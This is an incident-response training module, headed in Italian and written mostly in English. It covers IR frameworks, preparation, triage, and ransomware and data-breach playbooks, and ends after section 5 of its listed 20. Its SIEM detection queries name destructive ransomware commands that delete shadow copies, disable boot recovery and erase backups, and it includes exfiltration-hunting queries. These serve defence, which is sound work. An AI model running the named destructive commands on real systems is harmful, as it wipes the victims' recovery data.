# Incident Response Playbooks e Digital Forensics — Guida Completa

> **Modulo 31** · **Tempo:** 180 min · **Aggiornamento:** 2025-05-07

## Idee guida

1. **Preparation determines outcome.** The quality of response is decided months before the incident occurs.
2. **Containment speed > forensic purity when business is burning.** Balance evidence preservation with business continuity pragmatically.
3. **Playbooks are living documents.** A playbook not updated after the last incident is a liability, not an asset.
4. **Digital forensics is a chain of custody problem first, a technical problem second.**

---

## Indice

1. [Framework di Incident Response](#1-framework-di-incident-response)
2. [Preparazione](#2-preparazione)
3. [Identificazione e Triage](#3-identificazione-e-triage)
4. [Playbook: Ransomware](#4-playbook-ransomware)
5. [Playbook: Data Breach/Exfiltration](#5-playbook-data-breachexfiltration)
6. [Playbook: Advanced Persistent Threat (APT)](#6-playbook-advanced-persistent-threat-apt)
7. [Playbook: Insider Threat](#7-playbook-insider-threat)
8. [Digital Forensics Integration](#8-digital-forensics-integration)
9. [Post-Incident Activities](#9-post-incident-activities)
10. [Laboratorio](#10-laboratorio)
11. [NIST SP 800-61r3 e Integrazione con CSF 2.0](#11-nist-sp-800-61r3-e-integrazione-con-csf-20)
12. [Playbook: Phishing](#12-playbook-phishing)
13. [Playbook: Attacco DDoS](#13-playbook-attacco-ddos)
14. [Playbook: Business Email Compromise (BEC)](#14-playbook-business-email-compromise-bec)
15. [Playbook: Attacco alla Supply Chain](#15-playbook-attacco-alla-supply-chain)
16. [Playbook: Incidenti Cloud (AWS/Azure/GCP)](#16-playbook-incidenti-cloud-awsazuregcp)
17. [Automazione della Risposta agli Incidenti con SOAR](#17-automazione-della-risposta-agli-incidenti-con-soar)
18. [Scenari Tabletop Avanzati](#18-scenari-tabletop-avanzati)
19. [Script di Comunicazione di Crisi](#19-script-di-comunicazione-di-crisi)
20. [Conformità NIS2 — Obblighi di Notifica](#20-conformità-nis2--obblighi-di-notifica)

---

## 1. Framework di Incident Response

### 1.1 NIST SP 800-61r2 — Four-Phase Model

The NIST Computer Security Incident Handling Guide defines incident response as a cyclical process with four interconnected phases. This is the de facto standard for US federal agencies and widely adopted in private sector organizations globally.

**Phase 1: Preparation**
Establishing the IR capability before incidents occur. This includes policy development, team formation, tool acquisition, and training. Preparation is continuous — it never ends because the threat landscape never stops evolving.

**Phase 2: Detection and Analysis**
Identifying potential security incidents through monitoring, alerts, user reports, and external notifications. The critical challenge is distinguishing actual incidents from noise (false positives) and accurately assessing severity.

**Phase 3: Containment, Eradication, and Remediation**
Limiting the damage, removing the threat, and restoring systems to normal operation. NIST groups these three activities because in practice they overlap and iterate.

**Phase 4: Post-Incident Activity**
Documenting lessons learned, updating procedures, and feeding intelligence back into the preparation phase. This closes the loop and drives continuous improvement.

```
┌─────────────────────────────────────────────────────────────┐
│                    NIST SP 800-61r2                          │
│                                                             │
│   ┌──────────┐    ┌──────────────┐    ┌─────────────────┐  │
│   │Preparation├───►│Detection &   ├───►│Containment,     │  │
│   │           │◄───┤Analysis      │    │Eradication &    │  │
│   └──────────┘    └──────────────┘    │Remediation      │  │
│        ▲                               └────────┬────────┘  │
│        │                                        │           │
│        │          ┌──────────────┐              │           │
│        └──────────┤Post-Incident ◄──────────────┘           │
│                   │Activity      │                          │
│                   └──────────────┘                          │
└─────────────────────────────────────────────────────────────┘
```

### 1.2 SANS Six-Step Model (PICERL)

The SANS Institute model provides more granular separation of the response activities:

| Step | Phase | Key Activities |
|------|-------|----------------|
| 1 | **P**reparation | Policy, tools, training, retainers, exercises |
| 2 | **I**dentification | Detection, validation, scoping, documentation |
| 3 | **C**ontainment | Short-term isolation, long-term containment, system backup |
| 4 | **E**radication | Root cause removal, malware cleanup, patch application |
| 5 | **R**ecovery | System restoration, validation, monitoring enhancement |
| 6 | **L**essons Learned | Post-mortem, documentation, process improvement |

The SANS model explicitly separates Containment, Eradication, and Recovery (which NIST groups). This separation is practical because different teams often own different phases, and the decision criteria differ.

**Containment sub-decisions:**
- Short-term containment: Immediate isolation (e.g., VLAN quarantine, firewall block)
- System backup: Forensic image before any eradication
- Long-term containment: Temporary fix that allows partial business operation during investigation

### 1.3 FIRST CSIRT Framework

The Forum of Incident Response and Security Teams (FIRST) provides a maturity-based framework for building and assessing Computer Security Incident Response Teams. The FIRST framework focuses on:

- **Service portfolio definition** — What services does the CSIRT offer? (Reactive, proactive, quality management)
- **Constituency definition** — Who does the team serve? Clear boundaries prevent scope creep.
- **Authority model** — Shared authority vs. full authority over incident decisions
- **Information sharing policies** — TLP (Traffic Light Protocol) implementation, STIX/TAXII feeds
- **Maturity assessment** — SIM3 (Security Incident Management Maturity Model) self-assessment

FIRST categorizes CSIRT services into three tiers:

```
Reactive Services          Proactive Services         Quality Management
─────────────────          ───────────────────        ──────────────────
Alerts & warnings          Announcements              Risk analysis
Incident handling          Technology watch           Business continuity
Vulnerability handling     Security audits            Security consulting
Artifact handling          Config & maintenance       Awareness building
                           Infra development          Education/training
                           Intrusion detection        Product evaluation
```

### 1.4 ISO 27035 — Information Security Incident Management

ISO 27035 (parts 1-3) provides an international standard for incident management that integrates with the broader ISO 27001 ISMS. Its five-phase model:

1. **Plan and Prepare** — Establish policy, form team, define procedures, acquire tools
2. **Detection and Reporting** — Monitor, detect, report through defined channels
3. **Assessment and Decision** — Classify severity, decide on response, assign resources
4. **Responses** — Contain, investigate, resolve, communicate
5. **Lessons Learnt** — Review, improve, update documentation

ISO 27035's value is integration with your existing ISMS controls. If you are ISO 27001 certified, incident management is already a mandatory control (A.16). ISO 27035 tells you how to implement that control properly.

### 1.5 Building an IR Capability from Scratch

For organizations without an existing IR function, the build sequence matters:

**Month 1-2: Foundation**
- Draft IR policy (executive sponsorship required)
- Identify initial team members (even if part-time)
- Establish communication channels (out-of-band)
- Document current asset inventory and network topology
- Define incident severity levels

**Month 3-4: Tooling and Process**
- Deploy forensic workstation
- Establish evidence storage procedures
- Create initial playbooks for top 3 threat scenarios
- Implement basic detection (at minimum: endpoint logs → SIEM)
- Establish external relationships (ISACs, law enforcement contacts)

**Month 5-6: Testing and Refinement**
- Conduct first tabletop exercise
- Test communication procedures
- Validate forensic procedures with a mock case
- Refine playbooks based on exercise outcomes
- Begin threat intelligence consumption

**Ongoing: Maturity Growth**
- Quarterly tabletop exercises
- Annual purple team exercises
- Continuous playbook updates
- Regular tool evaluation
- Staff training and certifications (GCIH, GCFA, GREM)

### 1.6 CSIRT Team Composition and Roles

A mature CSIRT requires defined roles that activate during incidents:

| Role | Responsibilities | Skills Required |
|------|-----------------|-----------------|
| **Incident Commander (IC)** | Overall incident ownership, decision authority, resource allocation, stakeholder communication | Leadership, risk assessment, communication under pressure |
| **Technical Lead** | Direct technical investigation, coordinate analysts, validate findings | Deep technical expertise, forensics, malware analysis |
| **Communications Lead** | Internal updates, external comms, media relations, regulatory notifications | Clear writing, stakeholder management, legal awareness |
| **Legal Counsel** | Evidence preservation guidance, regulatory compliance, liability assessment | Cyber law, privacy regulations, litigation support |
| **Scribe/Documenter** | Real-time timeline documentation, action tracking, evidence log maintenance | Attention to detail, fast note-taking |
| **Subject Matter Experts** | Domain-specific technical support (network, endpoint, cloud, application) | Specialized platform knowledge |

**Role activation matrix by severity:**

| Role | P1 (Critical) | P2 (High) | P3 (Medium) | P4 (Low) |
|------|---------------|------------|-------------|----------|
| Incident Commander | Dedicated | Dedicated | On-call | N/A |
| Technical Lead | Dedicated | Dedicated | Assigned | N/A |
| Communications Lead | Dedicated | On-call | N/A | N/A |
| Legal Counsel | On-call | Notified | N/A | N/A |
| Scribe | Dedicated | Assigned | N/A | N/A |
| SMEs | As needed | As needed | As needed | Self-service |

---

## 2. Preparazione

### 2.1 IR Plan Documentation

The IR plan is the master document that governs all incident response activities. It must be:
- Approved by executive leadership (CISO/CIO minimum)
- Reviewed at least annually
- Updated after every significant incident
- Accessible during incidents (offline copies required)

**Essential IR plan sections:**

```
1. Purpose and Scope
2. Authority and Governance
   - Who can declare an incident?
   - Who authorizes containment actions that impact business?
   - Escalation thresholds
3. Team Structure and Contact Information
   - Primary and backup for each role
   - Out-of-band contact methods
   - External contacts (legal, PR, IR retainer, law enforcement)
4. Incident Classification
   - Severity definitions with examples
   - Response SLAs per severity
5. Response Procedures (reference to playbooks)
6. Communication Procedures
   - Internal notification chains
   - External notification requirements
   - Status update cadence
7. Evidence Handling
   - Chain of custody procedures
   - Evidence storage locations
   - Retention requirements
8. Integration Points
   - Business continuity plan
   - Disaster recovery plan
   - Crisis communication plan
9. Training and Exercise Schedule
10. Plan Maintenance Schedule
```

### 2.2 Communication Plans

Communication failures during incidents cause more organizational damage than the incidents themselves. Three communication streams must be pre-planned:

**Internal Communication:**

| Audience | Information | Channel | Cadence |
|----------|-------------|---------|---------|
| Executive leadership | Business impact, risk, decisions needed | Secure call + encrypted email | Every 2 hours (P1), daily (P2) |
| IT staff | Technical details, tasks, status | War room + Slack/Teams | Continuous during P1 |
| All employees | What they need to know/do | Corporate email + intranet | As needed |
| Help desk | Scripts for user inquiries | Internal KB | At incident declaration |

**External Communication:**

| Audience | Information | Channel | Timing |
|----------|-------------|---------|--------|
| Customers | Impact, actions taken, what they should do | Email + status page | After legal review |
| Regulators | Breach notification per statute | Formal written notice | Per regulatory timeline |
| Partners/vendors | Relevant impact to shared services | Direct contact | As determined by IC |
| Media | Official statement only | Press release via PR | After legal review |

**Communication template — Initial internal notification:**

```
SUBJECT: [SEVERITY] Security Incident — [SHORT DESCRIPTION]

CLASSIFICATION: [TLP:RED / TLP:AMBER / TLP:GREEN]

INCIDENT ID: INC-[YYYY]-[NNN]
DECLARED:    [YYYY-MM-DD HH:MM UTC]
SEVERITY:    [P1/P2/P3/P4]
IC:          [Name, contact]

SUMMARY:
[2-3 sentences describing what is known]

CURRENT STATUS:
[Containment/Investigation/Eradication/Recovery]

BUSINESS IMPACT:
[Known or estimated impact to services/users/data]

ACTIONS REQUIRED:
[Specific actions recipients need to take]

NEXT UPDATE:
[Scheduled time for next communication]

DO NOT: Forward this message, discuss on unsecured channels,
contact media or external parties without IC approval.
```

### 2.3 Evidence Preservation Toolkit

Physical and logical tools that must be ready before an incident occurs:

**Jump Bag Contents:**

| Category | Items |
|----------|-------|
| Write blockers | Tableau T35es (SATA/IDE), CRU WiebeTech (USB 3.0/NVMe) |
| Storage | Sanitized destination drives (minimum 4TB each, ×3), tamper-evident bags |
| Forensic boot media | CAINE Live USB, Kali Forensics, Windows PE with FTK Imager |
| Network capture | Network TAP (passive), Ethernet cables, USB-Ethernet adapters |
| Documentation | Chain of custody forms, incident log sheets, evidence labels, Sharpies |
| Connectivity | 4G/5G hotspot (independent of corporate network), charged batteries |
| Accessories | Screwdriver set, anti-static bags, camera for physical evidence photos |

**Forensic Workstation Requirements:**

- Isolated from corporate network (or air-gapped for sensitive cases)
- Minimum 128GB RAM (memory forensics with large captures)
- Fast NVMe storage (2TB+ for case work)
- Hardware write-blocker interface
- Licensed tools: FTK/EnCase/X-Ways (at least one)
- Open-source stack: Autopsy, Volatility 3, Plaso, YARA, Zeek
- Validated hash tools (certutil, sha256sum, HashCalc)
- Clean OS installation (re-imaged periodically)

### 2.4 Retainer Agreements with IR Firms

Most organizations need external IR support for complex incidents. Retainer agreements ensure immediate availability:

**Key retainer terms to negotiate:**
- Response time SLA (4-hour for P1, 24-hour for P2)
- Number of guaranteed concurrent resources
- On-site response capability and travel logistics
- Access to specialized capabilities (malware reverse engineering, threat intelligence)
- Hourly rates and rate caps
- Scope expansion procedures
- Confidentiality and non-disclosure terms
- Conflict of interest provisions (are they also retained by your competitors?)
- Data handling and evidence return/destruction
- Integration with your internal IR process

**Top-tier DFIR firms (reference, not endorsement):**
Mandiant (Google), CrowdStrike Services, Secureworks, Kroll, Unit 42 (Palo Alto), IBM X-Force IR, NCC Group

### 2.5 Tabletop Exercises — Design and Execution

Tabletop exercises (TTXs) validate your IR capability without the risk and cost of live testing.

**Exercise design framework:**

```
1. OBJECTIVES (what are we testing?)
   - Communication procedures
   - Decision-making processes
   - Technical response capabilities
   - Coordination between teams

2. SCENARIO (realistic, relevant threat)
   - Based on current threat intelligence
   - Tailored to your industry and infrastructure
   - Progressive complexity (injects add complications)

3. PARTICIPANTS (who needs to be there?)
   - IC and technical leads (mandatory)
   - Executive sponsor (at least for first/last 30 min)
   - Legal, HR, PR representatives
   - External parties if applicable (IR retainer, insurance)

4. INJECTS (scenario escalation points)
   - Time-gated revelations
   - Decision points requiring participant choice
   - Complications: media leak, regulatory contact, insider angle

5. EVALUATION CRITERIA
   - Decisions made within SLA
   - Communication procedures followed
   - Escalation triggers recognized
   - Evidence preservation considered
```

**Sample inject sequence for a ransomware TTX:**

| Time | Inject | Expected Response |
|------|--------|-------------------|
| T+0 | SOC alerts: multiple EDR detections of suspicious PowerShell | Triage, initial classification |
| T+15 | File server shares show encrypted files appearing | Escalate to P1, activate IC |
| T+30 | Ransom note found, demands $2M in Monero | Notify legal, insurance, executive |
| T+45 | Media outlet contacts PR about "breach at your company" | Activate crisis comms plan |
| T+60 | Attacker emails CEO directly threatening data publication | Decision point: engage negotiator? |
| T+75 | IT discovers backup server was also compromised | Reassess recovery strategy |
| T+90 | Law enforcement contacts your team (they are tracking this group) | Coordinate with LE |

### 2.6 Threat Intelligence Integration for Proactive IR

Threat intelligence transforms IR from purely reactive to partially proactive:

**Intelligence sources to integrate:**

- **Commercial feeds**: Recorded Future, Mandiant Advantage, CrowdStrike Falcon Intelligence
- **Open source**: AlienVault OTX, MISP communities, abuse.ch, PhishTank
- **ISACs**: Industry-specific sharing (FS-ISAC, H-ISAC, IT-ISAC)
- **Government**: CISA alerts, FBI PIN/Flash, Europol advisories
- **Internal**: Your own incident data, threat hunting findings

**Integration points with IR:**
- Update detection rules based on current TTPs targeting your sector
- Pre-build containment procedures for threats actively targeting peers
- Identify IOCs to sweep for proactively (hunt before detection fires)
- Brief IR team on active campaigns relevant to your environment
- Inform tabletop scenarios with current threat actor behavior

---

## 3. Identificazione e Triage

### 3.1 Detection Sources

Incidents are detected through multiple channels. Each source has different fidelity, timeliness, and context:

| Source | Fidelity | Timeliness | Context | Example |
|--------|----------|------------|---------|---------|
| SIEM correlation rules | Medium-High | Near real-time | Good (enriched) | Multiple failed logins → successful login → privilege escalation |
| EDR/XDR alerts | High | Real-time | Excellent (process tree) | Cobalt Strike beacon execution detected |
| Network detection (IDS/NDR) | Medium | Real-time | Limited (network only) | C2 communication pattern detected |
| User reports | Variable | Delayed | Variable | "My files look strange" |
| Threat intelligence | High | Proactive | Excellent | Your domain found on C2 infrastructure |
| External notification | High | Variable | Variable | Law enforcement tip, researcher report |
| Vulnerability scanner | Low (no exploitation proof) | Scheduled | Good | Critical vuln on internet-facing system |
| Dark web monitoring | Variable | Delayed | Limited | Credentials for sale mentioning your domain |

### 3.2 Initial Triage Decision Tree

```
┌─────────────────────────────────────────────────────┐
│              ALERT / REPORT RECEIVED                  │
└────────────────────────┬────────────────────────────┘
                         │
                         ▼
              ┌─────────────────────┐
              │ Is this a known      │
              │ false positive?      │
              └──────────┬──────────┘
                    │         │
                   YES        NO
                    │         │
                    ▼         ▼
         ┌──────────────┐  ┌──────────────────────┐
         │Document and   │  │Validate: Can we      │
         │tune detection │  │confirm malicious     │
         │rule           │  │activity?             │
         └──────────────┘  └──────────┬───────────┘
                                 │         │
                               YES        NOT YET
                                 │         │
                                 ▼         ▼
                    ┌─────────────────┐  ┌─────────────────────┐
                    │Classify severity │  │Gather additional     │
                    │(see 3.3)         │  │context (30 min max)  │
                    └────────┬────────┘  └──────────┬──────────┘
                             │                      │
                             ▼                      ▼
                    ┌─────────────────┐  ┌─────────────────────┐
                    │Assign incident   │  │Sufficient to         │
                    │ID, begin response│  │classify? If no →     │
                    └─────────────────┘  │escalate to Tier 2    │
                                         └─────────────────────┘
```

### 3.3 Severity Classification

| Priority | Name | Definition | Response SLA | Examples |
|----------|------|------------|-------------|----------|
| **P1** | Critical | Active compromise with significant business impact, data exfiltration confirmed or imminent, safety risk | 15 min to acknowledge, immediate response | Active ransomware, confirmed data breach, APT detected |
| **P2** | High | Confirmed compromise with contained/limited impact, or uncontained but low-impact | 30 min acknowledge, 1 hour response | Compromised user account, malware on single host, phishing with credential harvest |
| **P3** | Medium | Potential compromise requiring investigation, policy violations with security implications | 4 hour acknowledge, next business day response | Suspicious activity patterns, unauthorized software, policy violations |
| **P4** | Low | Security events requiring documentation but no immediate action, reconnaissance detected | Next business day | Port scans, failed brute force (blocked), minor policy deviations |

### 3.4 Incident Categorization Taxonomy

Based on US-CERT and ENISA categories:

| Category | Code | Description |
|----------|------|-------------|
| Unauthorized Access | CAT-1 | Gaining logical or physical access without permission |
| Denial of Service | CAT-2 | Disruption of service availability |
| Malicious Code | CAT-3 | Virus, worm, trojan, ransomware, implant |
| Improper Usage | CAT-4 | Violation of acceptable use policies |
| Scans/Probes/Recon | CAT-5 | Reconnaissance activity against systems |
| Investigation | CAT-6 | Unconfirmed events under analysis |
| Data Breach | CAT-7 | Confirmed unauthorized data access or exfiltration |
| Insider Threat | CAT-8 | Malicious or negligent insider activity |

### 3.5 Escalation Procedures

Escalation is triggered by severity thresholds and time-based criteria:

```
Level 1 (SOC Analyst):
  - Initial detection and triage
  - Can handle P4 independently
  - Must escalate P3+ within 30 minutes if unresolved

Level 2 (Senior Analyst / IR Team):
  - Investigation and initial containment
  - Can handle P3 independently
  - Must escalate P2+ within 1 hour if scope expands

Level 3 (Incident Commander):
  - Activated for all P1, P2 with expanding scope
  - Owns resource allocation and stakeholder comms
  - Escalates to executive leadership per criteria below

Executive Escalation Criteria (any one triggers):
  - Confirmed data breach involving PII/regulated data
  - Ransomware with business-critical system impact
  - Incident with media exposure risk
  - Regulatory notification required
  - Financial impact exceeds $[threshold]
  - Safety risk to personnel
```

### 3.6 False Positive Identification

Reducing false positive volume is an ongoing operational discipline. Common patterns:

**SIEM correlation tuning:**
```
# Example: Reduce false positives on brute-force detection
# Before: alert on 5 failed logins in 5 minutes (any account)
# Problem: service accounts retry legitimately

# After: alert on 5 failed logins in 5 minutes
#   EXCLUDING: service accounts in whitelist
#   AND: source IP not in known-good ranges
#   AND: followed by successful login within 10 minutes
```

**EDR baseline management:**
- Maintain application whitelists updated during change windows
- Tag legitimate admin tools vs. suspicious use (PsExec, PowerShell remoting)
- Correlate with change management tickets for expected maintenance activity

**False positive documentation requirement:**
Every false positive dismissal must be documented with:
1. Why it is a false positive (specific evidence)
2. What tuning action was taken (or why none was needed)
3. Review date for re-evaluation

---

## 4. Playbook: Ransomware

### 4.1 Initial Detection Indicators

**High-confidence indicators (P1 immediate):**
- Mass file encryption activity (high entropy writes to file shares)
- Ransom notes appearing on systems
- Known ransomware process names or hashes (EDR match)
- Volume Shadow Copy deletion (vssadmin/wmic commands)

**Medium-confidence indicators (investigate rapidly):**
- Unusual PowerShell/CMD execution patterns
- Large-scale scheduled task creation
- Group Policy modifications (domain-wide ransomware deployment)
- Anomalous SMB traffic patterns (lateral scanning)
- PsExec or WMIC lateral movement activity

**SIEM detection queries:**

```spl
# Splunk — Volume Shadow Copy deletion
index=windows EventCode=4688
(CommandLine="*vssadmin*delete*shadows*" OR
 CommandLine="*wmic*shadowcopy*delete*" OR
 CommandLine="*bcdedit*/set*{default}*recoveryenabled*no*")
| stats count by src_host, user, CommandLine
| where count > 0

# Splunk — Mass file rename (encryption indicator)
index=windows EventCode=4663 ObjectType="File"
| bucket _time span=1m
| stats dc(ObjectName) as unique_files by src_host, _time
| where unique_files > 100
| sort -unique_files
```

```kql
// Microsoft Sentinel — Ransomware behavior
DeviceProcessEvents
| where Timestamp > ago(1h)
| where (ProcessCommandLine has_any ("vssadmin","wmic shadowcopy",
         "bcdedit","wbadmin delete"))
   or (ProcessCommandLine has_all ("cipher","/w"))
| project Timestamp, DeviceName, InitiatingProcessAccountName,
          FileName, ProcessCommandLine
| sort by Timestamp desc
```

### 4.2 Immediate Containment Steps

**Time-critical actions (first 30 minutes):**

```
MINUTE 0-5: Isolate confirmed infected hosts
  □ Network isolation via EDR (preferred — preserves evidence)
  □ If EDR unavailable: VLAN quarantine via switch port
  □ If neither: physical disconnect (last resort, loses volatile data)
  □ DO NOT power off (preserves memory for forensics)

MINUTE 5-10: Prevent lateral spread
  □ Disable compromised accounts in AD
  □ Block known C2 IPs/domains at firewall and DNS
  □ Disable SMBv1 if still enabled (emergency GPO or firewall rule)
  □ Consider: disable administrative shares (C$, ADMIN$)

MINUTE 10-20: Protect critical assets
  □ Isolate domain controllers (network ACL, not shutdown)
  □ Isolate backup infrastructure (prevent encryption of backups)
  □ Isolate known-clean critical systems preemptively
  □ Verify backup integrity (are recent backups clean?)

MINUTE 20-30: Scope assessment
  □ Query EDR for spread indicators across all endpoints
  □ Check AD for unauthorized changes (new admins, GPO modifications)
  □ Review file share access logs for encryption patterns
  □ Determine initial access vector if possible
```

**Network containment commands:**

```bash
# Emergency firewall rules (iptables — Linux gateway)
# Block known C2 addresses
iptables -I FORWARD -d 198.51.100.0/24 -j DROP
iptables -I FORWARD -s 198.51.100.0/24 -j DROP

# Block SMB lateral movement from compromised segment
iptables -I FORWARD -s 10.0.5.0/24 -p tcp --dport 445 -j DROP
iptables -I FORWARD -s 10.0.5.0/24 -p tcp --dport 135 -j DROP

# Palo Alto CLI — Block C2 domain
set rulebase security rules emergency-block-c2 from any to any \
  destination-address none application any action deny
# Use EDL (External Dynamic List) for rapid IOC ingestion
```

```powershell
# Active Directory emergency containment
# Disable compromised accounts
Get-ADUser -Filter {Enabled -eq $true} -SearchBase "OU=Compromised,DC=corp,DC=local" |
  Disable-ADAccount

# Reset krbtgt (careful: two resets, 10+ hours apart for full rotation)
# First reset — invalidates all existing tickets
Reset-KrbtgtKeyInteractive -DomainController DC01

# Force GPO to block PsExec/WMIC on remaining systems
New-GPO -Name "Emergency-Block-Lateral" |
  Set-GPRegistryValue -Key "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" `
    -ValueName "LocalAccountTokenFilterPolicy" -Type DWord -Value 0
```

### 4.3 Communication Protocol

```
T+0    → IC activates war room (physical or virtual)
T+5    → IC sends initial notification (TLP:RED) to core IR team
T+15   → Technical lead provides first situation brief to IC
T+30   → IC sends first executive notification (impact assessment)
T+60   → Communications lead prepares holding statement for external use
T+2h   → IC sends first scheduled update to stakeholders
T+4h   → Legal assesses notification obligations
Ongoing → Updates every 2 hours until containment confirmed
         → Updates every 4 hours during eradication
         → Daily updates during recovery
```

### 4.4 Ransom Payment Decision Framework

**This is a business and legal decision, not a technical one.**

Decision factors:

| Factor | Pay Consideration | Do Not Pay Consideration |
|--------|-------------------|--------------------------|
| Backup availability | Backups compromised or too old | Clean, recent, verified backups available |
| Business impact | Existential threat to business | Tolerable downtime |
| Decryptor availability | No known free decryptor | NoMoreRansom.org has tool |
| Data exfiltration | Data published = additional harm | No evidence of exfiltration |
| Insurance | Cyber policy covers ransom | Policy excludes or insurer opposes |
| Legal | No sanctions issues with threat group | OFAC-sanctioned group (paying is illegal) |
| Law enforcement | LE requests delay but doesn't prohibit | LE strongly advises against |
| Precedent | First incident, no pattern to establish | Repeat targeting if payment made |

**CRITICAL: Sanctions screening is mandatory.** Paying ransom to OFAC-designated groups (Lazarus/DPRK, Evil Corp, certain Russian groups) violates US law regardless of circumstances. FinCEN advisory FIN-2021-A004 provides guidance.

**NoMoreRansom Project (nomoreransom.org):**
Before any payment consideration:
1. Identify the ransomware variant (ransom note text, encrypted file extension, behavior)
2. Check nomoreransom.org/crypto-sheriff
3. Check ID Ransomware (id-ransomware.malwarehunterteam.com)
4. Check vendor-specific decryptor repositories (Emsisoft, Kaspersky, Avast)

### 4.5 Recovery from Backups

**Recovery decision tree:**

```
Can we restore from backup?
├── YES: Are backups verified clean?
│   ├── YES: Proceed with restoration
│   │   ├── Restore to isolated environment first
│   │   ├── Scan restored data for malware
│   │   ├── Verify data integrity
│   │   └── Reconnect to production incrementally
│   └── NO: When was last known-good backup?
│       ├── Acceptable RPO → Restore older backup
│       └── Unacceptable RPO → Explore alternative recovery
└── NO: Backups destroyed/encrypted
    ├── Engage IR retainer for advanced recovery options
    ├── Explore volume shadow copies (if attacker missed them)
    ├── Consider cloud storage version history
    └── Payment decision framework (4.4)
```

### 4.6 Evidence Preservation for Law Enforcement

Even during urgent recovery, preserve evidence:

```bash
# Memory capture before any remediation (use DumpIt, WinPmem, or LiME)
# Windows — WinPmem
winpmem_mini_x64.exe output_ram.raw

# Linux — LiME
insmod /path/to/lime.ko "path=/evidence/memory.lime format=lime"

# Disk image of patient zero (use write blocker or read-only mount)
dc3dd if=/dev/sda of=/evidence/disk_image.dd hash=sha256 \
  log=/evidence/disk_image.log

# Preserve network logs (firewall, proxy, DNS) for 90 days minimum
# Preserve SIEM logs for incident timeframe ± 30 days
# Photograph physical evidence (screen with ransom note, etc.)
```

**Chain of custody documentation:**
- Who collected it, when (UTC timestamp), where
- Hash values (SHA-256 minimum) computed at collection time
- Storage location and access controls
- Every transfer of custody documented and signed

### 4.7 Post-Incident Hardening

After recovery, implement hardening to prevent recurrence:

- Patch the initial access vector (if identified)
- Implement network segmentation to limit lateral movement
- Deploy or harden EDR across all endpoints (no exceptions)
- Enable MFA on all administrative accounts and VPN access
- Implement privileged access workstations (PAWs) for tier-0 assets
- Restrict PowerShell execution (Constrained Language Mode, logging)
- Disable unnecessary remote administration tools
- Implement application whitelisting on critical systems
- Deploy canary files/tokens for early ransomware detection
- Verify backup isolation (air-gapped or immutable storage)

---

## 5. Playbook: Data Breach/Exfiltration

### 5.1 Identifying Scope

The fundamental questions to answer immediately:

1. **What data?** PII, PHI, financial, intellectual property, credentials, source code
2. **How much?** Record count, volume in GB, timeframe of access
3. **Which systems?** Databases, file shares, cloud storage, email, SaaS applications
4. **How?** Exfiltration method (DNS tunneling, HTTPS to cloud storage, email, USB, print)
5. **Who?** External attacker, insider, compromised partner, automated tool

**Data flow analysis commands:**

```bash
# Network traffic analysis — identify exfiltration volume
# Zeek (formerly Bro) connection logs
cat conn.log | zeek-cut ts id.orig_h id.resp_h id.resp_p orig_bytes resp_bytes |
  awk '$6 > 100000000' |  # >100MB transferred
  sort -t$'\t' -k6 -rn | head -20

# DNS exfiltration detection — abnormally long queries
cat dns.log | zeek-cut ts query qtype |
  awk '{if(length($2) > 60) print}' |
  sort | uniq -c | sort -rn | head -20

# SIEM query for large outbound transfers (Splunk)
index=network sourcetype=firewall action=allowed direction=outbound
| stats sum(bytes_out) as total_bytes by src_ip, dest_ip, dest_port
| where total_bytes > 1073741824
| sort -total_bytes
```

### 5.2 Containment Without Alerting Attacker

When dealing with a sophisticated attacker, premature containment actions can trigger data destruction or accelerated exfiltration ("smash and grab"):

**Silent containment measures:**
- Redirect DNS for C2 domains to sinkhole (attacker's tools fail silently)
- Rate-limit suspicious outbound connections (slow exfiltration to buy time)
- Enable enhanced logging on compromised systems (do not reboot, do not patch)
- Rotate credentials for uncompromised accounts only (do not reset compromised accounts yet)
- Add monitoring rules but do not block (observation phase)

**Timing decision:**
```
IF attacker is actively exfiltrating AND data is highly sensitive:
  → Immediate hard containment (accept that attacker knows they are detected)

IF attacker is dormant or slow-exfiltrating AND investigation is progressing:
  → Silent monitoring to map full scope before coordinated eviction

IF regulatory clock is ticking (GDPR 72h, SEC 4 business days):
  → Contain first, investigate in parallel
```

### 5.3 Forensic Evidence Collection

**For data breach cases, prioritize:**

1. System logs showing data access (who queried what, when)
2. Network logs showing data transfer (destination, volume, protocol)
3. Authentication logs (how attacker gained access)
4. Database audit logs (queries executed, rows returned)
5. Cloud access logs (CloudTrail, GCP audit, Azure activity)

```bash
# Windows — Export Security event log
wevtutil epl Security C:\evidence\security.evtx

# Windows — Export specific events (logon events)
wevtutil qe Security /q:"*[System[(EventID=4624 or EventID=4625 or EventID=4648)]]" \
  /f:text > C:\evidence\logon_events.txt

# Linux — Preserve auth logs
cp /var/log/auth.log /evidence/auth.log.$(date +%Y%m%d)
cp /var/log/secure /evidence/secure.$(date +%Y%m%d)

# AWS CloudTrail — Export events for compromised user
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=Username,AttributeValue=compromised_user \
  --start-time "2025-04-01T00:00:00Z" \
  --end-time "2025-05-07T23:59:59Z" \
  --output json > /evidence/cloudtrail_user.json
```

### 5.4 Data Classification Impact Assessment

Impact depends on what was taken:

| Data Classification | Regulatory Impact | Notification Required | Financial Exposure |
|--------------------|-------------------|----------------------|-------------------|
| Public data | None | No | Minimal |
| Internal data | Low | Unlikely | Reputational |
| Confidential (PII) | GDPR, CCPA, state breach laws | Yes (individual + authority) | Significant (fines + litigation) |
| Restricted (PHI) | HIPAA | Yes (HHS + individuals) | Severe ($100-$50K per record) |
| Secret (financial/trade) | SEC, SOX | Potentially (material event) | Existential |
| Regulated (PCI) | PCI-DSS | Card brands + acquiring bank | Fines + loss of processing |

### 5.5 Regulatory Notification Requirements

| Regulation | Timeline | Authority | Individuals | Key Requirements |
|-----------|----------|-----------|-------------|------------------|
| **GDPR (EU)** | 72 hours from awareness | Supervisory Authority (DPA) | "Without undue delay" | Nature of breach, categories of data, approximate records, consequences, measures taken |
| **CCPA/CPRA (California)** | "Most expedient time possible" | California AG (if >500 residents) | Yes, written notice | Description of breach, types of info, steps to protect |
| **SEC (public companies)** | 4 business days (material) | SEC Form 8-K Item 1.05 | Via filing (public) | Material impact assessment, nature, scope, timing |
| **HIPAA (US healthcare)** | 60 days (individual), 60 days (HHS if >500) | HHS OCR | Yes | Description, types of PHI, steps individuals should take |
| **NIS2 (EU critical infra)** | 24h early warning, 72h notification | National CSIRT | Case-by-case | Significant incident assessment, cross-border impact |
| **State breach laws (US)** | Varies (30-90 days typical) | State AG | Yes | Varies by state — check each applicable jurisdiction |

